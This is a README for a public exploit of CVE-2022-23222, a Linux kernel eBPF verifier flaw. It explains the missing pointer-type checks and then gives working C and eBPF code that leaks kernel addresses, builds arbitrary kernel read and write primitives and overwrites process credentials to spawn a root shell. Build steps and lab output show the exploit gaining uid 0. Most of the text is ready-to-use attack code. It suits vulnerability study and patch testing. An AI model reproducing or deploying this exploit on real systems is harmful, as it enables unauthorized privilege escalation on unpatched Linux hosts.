# CVE-2022-23222

[Click here if you just wanna build and run the dang thing.](#building)
What follows is more or less a translation of the Chinese writeup,
available [here](https://tr3e.ee/posts/cve-2022-23222-linux-kernel-ebpf-lpe.txt).

We'll use the mainline kernel code for version [`5.13.0`](https://elixir.bootlin.com/linux/v5.13/source) as a reference.
There is a mismatch in available pointer types and the function that checks their bounds.
This mismatch was first introduced in Linux 5.8 and has since been patched.
The list of available pointer types is
available [here](https://elixir.bootlin.com/linux/v5.13/source/include/linux/bpf.h#L387).

```c
/* types of values stored in eBPF registers */
/* Pointer types represent:
 * pointer
 * pointer + imm
 * pointer + (u16) var
 * pointer + (u16) var + imm
 * if (range > 0) then [ptr, ptr + range - off) is safe to access
 * if (id > 0) means that some 'var' was added
 * if (off > 0) means that 'imm' was added
 */
enum bpf_reg_type {
	NOT_INIT = 0,		 /* nothing was written into register */
	SCALAR_VALUE,		 /* reg doesn't contain a valid pointer */
	PTR_TO_CTX,		 /* reg points to bpf_context */
	CONST_PTR_TO_MAP,	 /* reg points to struct bpf_map */
	PTR_TO_MAP_VALUE,	 /* reg points to map element value */
	PTR_TO_MAP_VALUE_OR_NULL,/* points to map elem value or NULL */
	PTR_TO_STACK,		 /* reg == frame_pointer + offset */
	PTR_TO_PACKET_META,	 /* skb->data - meta_len */
	PTR_TO_PACKET,		 /* reg points to skb->data */
	PTR_TO_PACKET_END,	 /* skb->data + headlen */
	PTR_TO_FLOW_KEYS,	 /* reg points to bpf_flow_keys */
	PTR_TO_SOCKET,		 /* reg points to struct bpf_sock */
	PTR_TO_SOCKET_OR_NULL,	 /* reg points to struct bpf_sock or NULL */
	PTR_TO_SOCK_COMMON,	 /* reg points to sock_common */
	PTR_TO_SOCK_COMMON_OR_NULL, /* reg points to sock_common or NULL */
	PTR_TO_TCP_SOCK,	 /* reg points to struct tcp_sock */
	PTR_TO_TCP_SOCK_OR_NULL, /* reg points to struct tcp_sock or NULL */
	PTR_TO_TP_BUFFER,	 /* reg points to a writable raw tp's buffer */
	PTR_TO_XDP_SOCK,	 /* reg points to struct xdp_sock */
    // ... omitted ...
	PTR_TO_BTF_ID,
	PTR_TO_BTF_ID_OR_NULL,
	PTR_TO_MEM,		 /* reg points to valid memory region */
	PTR_TO_MEM_OR_NULL,	 /* reg points to valid memory region or NULL */
	PTR_TO_RDONLY_BUF,	 /* reg points to a readonly buffer */
	PTR_TO_RDONLY_BUF_OR_NULL, /* reg points to a readonly buffer or NULL */
	PTR_TO_RDWR_BUF,	 /* reg points to a read/write buffer */
	PTR_TO_RDWR_BUF_OR_NULL, /* reg points to a read/write buffer or NULL */
	PTR_TO_PERCPU_BTF_ID,	 /* reg points to a percpu kernel variable */
	PTR_TO_FUNC,		 /* reg points to a bpf program function */
	PTR_TO_MAP_KEY,		 /* reg points to a map element key */
	__BPF_REG_TYPE_MAX,
};
```

As you can see, there are a number of `_OR_NULL` pointer types that are used when a pointer might
be... null. The verifier will generally only let you do a null check at this point, or as an argument
in some functions. The following function,
available [here](https://elixir.bootlin.com/linux/v5.13/source/kernel/bpf/verifier.c#L6720),
is responsible for tracking and checking pointer boundaries.

```c
/* Handles arithmetic on a pointer and a scalar: computes new min/max and var_off.
 * Caller should also handle BPF_MOV case separately.
 * If we return -EACCES, caller may want to try again treating pointer as a
 * scalar.  So we only emit a diagnostic if !env->allow_ptr_leaks.
 */
static int adjust_ptr_min_max_vals(struct bpf_verifier_env *env,
				   struct bpf_insn *insn,
				   const struct bpf_reg_state *ptr_reg,
				   const struct bpf_reg_state *off_reg)
{
    // ... omitted ...

	switch (ptr_reg->type) {
	case PTR_TO_MAP_VALUE_OR_NULL:
		verbose(env, "R%d pointer arithmetic on %s prohibited, null-check it first\n",
			dst, reg_type_str[ptr_reg->type]);
		return -EACCES;
	case CONST_PTR_TO_MAP:
		/* smin_val represents the known value */
		if (known && smin_val == 0 && opcode == BPF_ADD)
			break;
		fallthrough;
	case PTR_TO_PACKET_END:
	case PTR_TO_SOCKET:
	case PTR_TO_SOCKET_OR_NULL:
	case PTR_TO_SOCK_COMMON:
	case PTR_TO_SOCK_COMMON_OR_NULL:
	case PTR_TO_TCP_SOCK:
	case PTR_TO_TCP_SOCK_OR_NULL:
	case PTR_TO_XDP_SOCK:
		verbose(env, "R%d pointer arithmetic on %s prohibited\n",
			dst, reg_type_str[ptr_reg->type]);
		return -EACCES;
	default:
		break;
	}
    
    // ... omitted ...
    
	return 0;
}
```

Unfortunately, this list is missing some types. Specifically,
`PTR_TO_BTF_ID`, `PTR_TO_BTF_ID_OR_NULL`, `PTR_TO_MEM`,
`PTR_TO_MEM_OR_NULL`, `PTR_TO_RDONLY_BUF`, `PTR_TO_RDONLY_BUF_OR_NULL`,
`PTR_TO_RDWR_BUF`, and `PTR_TO_RDWR_BUF_OR_NULL`. By using the `RINGBUF`
map type, we can create a `PTR_TO_MEM_OR_NULL` which will allow us to perform
arithmetic when we shouldn't.

## Exploit Breakdown

First, we create two maps. The `ARRAY` map will be used to passing information
between userspace and the BPF program. The `RINGBUF` map will be used to give
a register the exploitable pointer type.

```c
int create_bpf_maps(context_t *ctx)
{
    int ret = 0;

    ret = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(u32), PAGE_SIZE, 1);
    if (ret < 0) {
        WARNF("Failed to create comm map: %d (%s)", ret, strerror(-ret));
        return ret;
    }
    ctx->comm_fd = ret;

    if ((ret = bpf_create_map(BPF_MAP_TYPE_RINGBUF, 0, 0, PAGE_SIZE)) < 0) {
        WARNF("Could not create ringbuf map: %d (%s)", ret, strerror(-ret));
        return ret;
    }
    ctx->ringbuf_fd = ret;

    return 0;
}
```

Now, we load and run a specially crafted BPF program which will first,
save the kernelspace address of the `ARRAY` map address to the BPF stack,
and then leverage the pointer oversight from before to nullify the last byte of
that address. The verifier will think we're reading from the start of the
array, but we're really reading a few bytes lower, which should (hopefully) give
us a kernel address.

```c
int do_leak(context_t *ctx)
{
    int ret = -1;
    struct bpf_insn insn[] = {
        // r9 = r1
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),

        // r0 = bpf_lookup_elem(ctx->comm_fd, 0)
        BPF_LD_MAP_FD(BPF_REG_1, ctx->comm_fd),
        BPF_ST_MEM(BPF_DW, BPF_REG_10, -8, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),

        // if (r0 == NULL) exit(1)
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, 1),
        BPF_EXIT_INSN(),

        // r8 = r0
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),

        // r0 = bpf_ringbuf_reserve(ctx->ringbuf_fd, PAGE_SIZE, 0)
        BPF_LD_MAP_FD(BPF_REG_1, ctx->ringbuf_fd),
        BPF_MOV64_IMM(BPF_REG_2, PAGE_SIZE),
        BPF_MOV64_IMM(BPF_REG_3, 0x00),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),

        // this is where the verifier loses track of r1
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1),

        // if (r0 != NULL) { ringbuf_discard(r0, 1); exit(2); }
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 5),
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_MOV64_IMM(BPF_REG_2, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard),
        BPF_MOV64_IMM(BPF_REG_0, 2),
        BPF_EXIT_INSN(),

        // verifier believe r0 = 0 and r1 = 0. However, r0 = 0 and  r1 = 1 on runtime.

        // r7 = r1 + 8
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_1),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 8),

        // verifier believe r7 = 8, but r7 = 9 actually.

        // store the array pointer (0xFFFF..........10 + 0xE0)
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_8),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0xE0),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_6, -8),

        // partial overwrite array pointer on stack

        // r0 = bpf_skb_load_bytes_relative(r9, 0, r8, r7, 0)
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -16),
        BPF_MOV64_REG(BPF_REG_4, BPF_REG_7),
        BPF_MOV64_IMM(BPF_REG_5, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes_relative),

        // r6 = 0xFFFF..........00 (off = 0xE0)
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_10, -8),
        BPF_ALU64_IMM(BPF_SUB, BPF_REG_6, 0xE0),

        
        // map_update_elem(ctx->comm_fd, 0, r6, 0)
        BPF_LD_MAP_FD(BPF_REG_1, ctx->comm_fd),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_8),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_6),
        BPF_MOV64_IMM(BPF_REG_4, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_update_elem),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };

    int prog = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, insn, sizeof(insn) / sizeof(insn[0]), "");
    if (prog < 0) {
        WARNF("Could not load program(do_leak):\n %s", bpf_log_buf);
        goto abort;
    }

    int err = bpf_prog_skb_run(prog, ctx->bytes, 8);

    if (err != 0) {
        WARNF("Could not run program(do_leak): %d (%s)", err, strerror(err));
        goto abort;
    }

    int key = 0;
    err = bpf_lookup_elem(ctx->comm_fd, &key, ctx->bytes);
    if (err != 0) {
        WARNF("Could not lookup comm map: %d (%s)", err, strerror(err));
        goto abort;
    }
    
    u64 array_map = (u64)ctx->ptrs[20] & (~0xFFL);
    if ((array_map&0xFFFFF00000000000) < 0xFFFF800000000000){
        WARNF("Could not leak array map: got %p", (kaddr_t)array_map);
        goto abort;
    }

    ctx->array_map = (kaddr_t)array_map;
    DEBUGF("array_map @ %p", ctx->array_map);

    ret = 0;

abort:
    if (prog > 0) close(prog);
    return ret;
}
```

Now we set up two BPF programs that leverage the same trick as before
to trick the verifier into thinking we have a pointer to something we are allowed
to access (in this case, to the `comm_fd` map same as before), when really it's an arbitrary pointer of our choosing. We
can then read from or write to that arbitrary address.

```c
int prepare_arbitrary_rw(context_t *ctx)
{
    int arbitrary_read_prog = 0;
    int arbitrary_write_prog = 0;

    struct bpf_insn arbitrary_read[] = {
        // r9 = r1
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),

        // r0 = bpf_lookup_elem(ctx->comm_fd, 0)
        BPF_LD_MAP_FD(BPF_REG_1, ctx->comm_fd),
        BPF_ST_MEM(BPF_DW, BPF_REG_10, -8, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),

        // if (r0 == NULL) exit(1)
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, 1),
        BPF_EXIT_INSN(),

        // r8 = r0
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),

        // r0 = bpf_ringbuf_reserve(ctx->ringbuf_fd, PAGE_SIZE, 0)
        BPF_LD_MAP_FD(BPF_REG_1, ctx->ringbuf_fd),
        BPF_MOV64_IMM(BPF_REG_2, PAGE_SIZE),
        BPF_MOV64_IMM(BPF_REG_3, 0x00),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),

        // this is where the verifier loses track of r1
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1),

        // if (r0 != NULL) { ringbuf_discard(r0, 1); exit(2); }
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 5),
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_MOV64_IMM(BPF_REG_2, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard),
        BPF_MOV64_IMM(BPF_REG_0, 2),
        BPF_EXIT_INSN(),

        // verifier believe r0 = 0 and r1 = 0. However, r0 = 0 and  r1 = 1 on runtime.

        // r7 = (r1 + 1) * 8
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_1),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 1),
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, 8),

        // verifier believe r7 = 8, but r7 = 16 actually.

        // store the array pointer
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_8, -8),

        // overwrite array pointer on stack

        // r0 = bpf_skb_load_bytes_relative(r9, 0, r8, r7, 0)
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -16),
        BPF_MOV64_REG(BPF_REG_4, BPF_REG_7),
        BPF_MOV64_IMM(BPF_REG_5, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes_relative),

        // fetch our arbitrary address pointer
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_10, -8),
        
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_6, 0),
        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };

    arbitrary_read_prog = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, arbitrary_read, sizeof(arbitrary_read) / sizeof(arbitrary_read[0]), "");
    if (arbitrary_read_prog < 0) {
        WARNF("Could not load program(arbitrary_write):\n %s", bpf_log_buf);
        goto abort;
    }

    struct bpf_insn arbitrary_write[] = {
        // r9 = r1
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),

        // r0 = bpf_lookup_elem(ctx->comm_fd, 0)
        BPF_LD_MAP_FD(BPF_REG_1, ctx->comm_fd),
        BPF_ST_MEM(BPF_DW, BPF_REG_10, -8, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),

        // if (r0 == NULL) exit(1)
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, 1),
        BPF_EXIT_INSN(),

        // r8 = r0
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),

        // r0 = bpf_ringbuf_reserve(ctx->ringbuf_fd, PAGE_SIZE, 0)
        BPF_LD_MAP_FD(BPF_REG_1, ctx->ringbuf_fd),
        BPF_MOV64_IMM(BPF_REG_2, PAGE_SIZE),
        BPF_MOV64_IMM(BPF_REG_3, 0x00),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_reserve),

        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1),

        // if (r0 != NULL) { ringbuf_discard(r0, 1); exit(2); }
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 5),
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_MOV64_IMM(BPF_REG_2, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_ringbuf_discard),
        BPF_MOV64_IMM(BPF_REG_0, 2),
        BPF_EXIT_INSN(),

        // verifier believe r0 = 0 and r1 = 0. However, r0 = 0 and  r1 = 1 on runtime.

        // r7 = (r1 + 1) * 8
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_1),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 1),
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, 8),

        // verifier believe r7 = 8, but r7 = 16 actually.

        // store the array pointer
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_8, -8),

        // overwrite array pointer on stack

        // r0 = bpf_skb_load_bytes_relative(r9, 0, r8, r7, 0)
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -16),
        BPF_MOV64_REG(BPF_REG_4, BPF_REG_7),
        BPF_MOV64_IMM(BPF_REG_5, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes_relative),

        // fetch our arbitrary address pointer
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_10, -8),
        
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),
        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, 8),

        // if (r0 == 0) { *(u64*)r6 = r1 }
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_1, 0),
        BPF_JMP_IMM(BPF_JA, 0, 0, 1),
        // else { *(u32*)r6 = r1 }
        BPF_STX_MEM(BPF_W, BPF_REG_6, BPF_REG_1, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };

    arbitrary_write_prog = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, arbitrary_write, sizeof(arbitrary_write) / sizeof(arbitrary_read[0]), "");
    if (arbitrary_write_prog < 0) {
        WARNF("Could not load program(arbitrary_write):\n %s", bpf_log_buf);
        goto abort;
    }

    ctx->arbitrary_read_prog = arbitrary_read_prog;
    ctx->arbitrary_write_prog = arbitrary_write_prog;
    return 0;

abort:
    if (arbitrary_read_prog > 0) close(arbitrary_read_prog);
    if (arbitrary_write_prog > 0) close(arbitrary_write_prog);
    return -1;
}
```

Now we can start escalating privileges. First, we'll spawn a bunch of
processes with a known name, set to `__ID__` (in this case, `"SCSLSCSL"`).
Then we'll have each of those processes stop itself just before attempting
to spawn a shell.

```c
int spawn_processes(context_t *ctx)
{
    for (int i = 0; i < PROC_NUM; i++)
    {
        pid_t child = fork();
        if (child == 0) {
            if (prctl(PR_SET_NAME, __ID__, 0, 0, 0) != 0) {
                WARNF("Could not set name");
            }
            uid_t old = getuid();
            kill(getpid(), SIGSTOP);
            uid_t uid = getuid();
            if (uid == 0 && old != uid) {
                OKF("Enjoy root!");
                system("/bin/sh");
            }
            exit(uid);
        }
        if (child < 0) {
            return child;
        }
        ctx->processes[i] = child;
    }

    return 0;
}
```

When these processes next resume, one of them should hopefully have root privileges.
The exploit sets up some arbitrary read and write helper functions, but they're not necessary
to understand. They just let you read and write arbitrary kernel addresses by invoking the
programs build above. Now we start scanning through memory until we find one of our processes
[`task_struct`](https://elixir.bootlin.com/linux/v5.13/source/include/linux/sched.h#L657)
until we find the name we set in [`comm`](https://elixir.bootlin.com/linux/v5.13/source/include/linux/sched.h#L972).
Then we go down `0x10` (16) bytes to the pointer
to [`cred`](https://elixir.bootlin.com/linux/v5.13/source/include/linux/sched.h#L958) (it tries two adjacent locations).

```c
int find_cred(context_t *ctx)
{
    for (int i = 0; i < PAGE_SIZE*PAGE_SIZE ; i++)
    {
        u64 val = 0;
        kaddr_t addr = ctx->array_map + PAGE_SIZE + i*0x8;
        if (arbitrary_read(ctx, addr, &val, BPF_DW) != 0) {
            WARNF("Could not read kernel address %p", addr);
            return -1;
        }

        // DEBUGF("addr %p = 0x%016x", addr, val);

        if (memcmp(&val, __ID__, sizeof(val)) == 0) {
            kaddr_t cred_from_task = addr - 0x10;
            
            if (arbitrary_read(ctx, cred_from_task + 8, &val, BPF_DW) != 0) {
                WARNF("Could not read kernel address %p + 8", cred_from_task);
                return -1;
            }

            if (val == 0 && arbitrary_read(ctx, cred_from_task, &val, BPF_DW) != 0) {
                WARNF("Could not read kernel address %p + 0", cred_from_task);
                return -1;
            }

            if (val != 0) {
                ctx->cred = (kaddr_t)val;
                DEBUGF("task struct ~ %p", cred_from_task);
                DEBUGF("cred @ %p", ctx->cred);
                return 0;
            }
            

        }
    }
    
    return -1;
}
```

Now that we have the address of one of our
processes [`cred`](https://elixir.bootlin.com/linux/v5.13/source/include/linux/cred.h#L110)
structs, we can escalate privileges by overwriting the credentials. We set the `uid`, `gid`, `euid`, and `egid` to zero.

```c
int overwrite_cred(context_t *ctx)
{
    if (arbitrary_write(ctx, ctx->cred + OFFSET_uid_from_cred, 0, BPF_W) != 0) {
        return -1;
    }
    if (arbitrary_write(ctx, ctx->cred + OFFSET_gid_from_cred, 0, BPF_W) != 0) {
        return -1;
    }
    if (arbitrary_write(ctx, ctx->cred + OFFSET_euid_from_cred, 0, BPF_W) != 0) {
        return -1;
    }
    if (arbitrary_write(ctx, ctx->cred + OFFSET_egid_from_cred, 0, BPF_W) != 0) {
        return -1;
    }

    return 0;
}
```

Now we "spawn a root shell" by resuming the processes from before. The process with the new root credentials
will spawn a shell with `system("/bin/sh")` while the remaining processes will exit.

```c
int spawn_root_shell(context_t *ctx)
{
    for (int i = 0; i < PROC_NUM; i++)
    {
        kill(ctx->processes[i], SIGCONT);
    }
    while(wait(NULL) > 0);

    return 0;
}
```

Once the user exits the root shell, we close all lingering file descriptors
and exit gracefully.

```c
int clean_up(context_t *ctx)
{
    close(ctx->comm_fd);
    close(ctx->arbitrary_read_prog);
    close(ctx->arbitrary_write_prog);
    kill(0, SIGCONT);
    return 0;
}
```

## Building

From the project root directory, with docker installed and permissioned for your user,
run the following command:

```
$ ./build.sh
```

This will build the exploit application using Ubuntu 20.04, which will run out of the box
on all the vulnerable target Ubuntu system(s).

```
❯ ./build.sh
Sending build context to Docker daemon   42.6MB
Step 1/6 : FROM ubuntu:20.04
 ---> 20fffa419e3a
Step 2/6 : ARG DEBIAN_FRONTEND=noninteractive
 ---> Using cache
 ---> 21a8156714bb
Step 3/6 : RUN apt-get update &&     apt-get upgrade -y &&     apt-get update &&     apt-get install build-essential curl -y
 ---> Using cache
 ---> 54b21b81a3ba
Step 4/6 : RUN curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
 ---> Using cache
 ---> bb02d929e275
Step 5/6 : ENV PATH="/root/.cargo/bin:${PATH}"
 ---> Using cache
 ---> 3475521f417d
Step 6/6 : WORKDIR /data
 ---> Using cache
 ---> 981ef909c81a
Successfully built 981ef909c81a
Successfully tagged cve_2022_23222:latest

Use 'docker scan' to run Snyk tests against images to find vulnerabilities and learn how to fix them
/data /data
    Updating crates.io index
 Downloading crates ...
  Downloaded cfg-if v1.0.0
  Downloaded cc v1.0.73
  Downloaded libc v0.2.126
  Downloaded memoffset v0.6.5
  Downloaded bitflags v1.3.2
  Downloaded autocfg v1.1.0
  Downloaded nix v0.24.1
   Compiling cve_2022_23222 v0.1.0 (/data)
    Finished release [optimized] target(s) in 34.45s
```

## Testing (Vagrant Lab)

With vagrant installed, simply run the following commands. By default, the vagrant
configuration will copy this folder to `/exploit` using `rsync`. You can modify the
`Vagrantfile` to suit your local environment, should you so choose.

```
❯ cd lab
❯ vagrant up && vagrant ssh
Bringing machine 'default' up with 'libvirt' provider...
#
# ... omitted for space ...
#
==> default: Running provisioner: shell...
    default: Running: inline script
    default: kernel.unprivileged_bpf_disabled = 0
vagrant@ubuntu2110:~$ /exploit/target/release/cve_2022_23222 
[D] DEBUG: array_map @ 0xffff8aecb303c000
[D] DEBUG: task struct ~ 0xffff8aecb3408ae8
[D] DEBUG: cred @ 0xffff8aec8c0b36c0
[+] Enjoy root!
# id
uid=0(root) gid=0(root) groups=0(root),1000(vagrant)
# exit 
vagrant@ubuntu2110:~$ 
logout
```

## References

 - [https://github.com/tr3ee/CVE-2022-23222](https://github.com/tr3ee/CVE-2022-23222)
 - [https://tr3e.ee/posts/cve-2022-23222-linux-kernel-ebpf-lpe.txt](https://tr3e.ee/posts/cve-2022-23222-linux-kernel-ebpf-lpe.txt)
 - [https://www.openwall.com/lists/oss-security/2022/01/18/2](https://www.openwall.com/lists/oss-security/2022/01/18/2)

## License

All of my code is released under the MIT license. The original author did not include a license file,
but said it was for "educational and research purposes only." Creating this was both educational, and for
research, so I think this counts. Consider the code under `src/exploit/` to have the same "for educational
and research purposes only" license. Whatever that means.
